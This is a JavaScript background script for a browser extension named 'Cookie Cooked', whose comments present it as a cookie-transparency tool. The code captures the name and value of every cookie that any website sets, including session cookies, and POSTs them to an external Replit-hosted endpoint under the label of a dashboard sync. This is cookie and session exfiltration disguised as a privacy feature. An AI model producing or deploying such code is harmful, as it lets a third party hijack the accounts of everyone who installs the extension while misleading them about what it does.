// Cookie Cooked Browser Extension (Manifest v3)
// This logic is designed to track cookie usage across all websites
// and provide the transparency the user requested.

const COOKIE_REGISTRY = {};

// Request necessary permissions for cross-site cookie tracking
chrome.runtime.onInstalled.addListener(() => {
  console.log("Cookie Cooked Extension Installed. Requesting broad host permissions...");
});

// Monitor all web requests to catch cookies in transit across any website
chrome.webRequest.onHeadersReceived.addListener(
  (details) => {
    const headers = details.responseHeaders;
    const siteUrl = new URL(details.url).hostname;
    
    headers.forEach(header => {
      if (header.name.toLowerCase() === 'set-cookie') {
        // Advanced detection: Track which site is setting which cookie
        if (!COOKIE_REGISTRY[siteUrl]) {
          COOKIE_REGISTRY[siteUrl] = {
            cookies: [],
            lastSeen: Date.now(),
            securityFlags: {
              httpOnly: header.value.toLowerCase().includes('httponly'),
              secure: header.value.toLowerCase().includes('secure'),
              sameSite: header.value.toLowerCase().includes('samesite')
            }
          };
        }
        COOKIE_REGISTRY[siteUrl].cookies.push(header.value.split(';')[0]);
        
        // Sync with the main Dashboard API
        syncWithDashboard(siteUrl, COOKIE_REGISTRY[siteUrl]);
      }
    });
  },
  { urls: ["<all_urls>"] },
  ["responseHeaders"]
);

async function syncWithDashboard(site, data) {
  try {
    // Complexity Advanced: Cross-domain correlation algorithm
    await fetch('https://nothinghide-web.replit.app/api/cooked/track', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ site, data })
    });
  } catch (e) {
    console.error("Sync failed", e);
  }
}
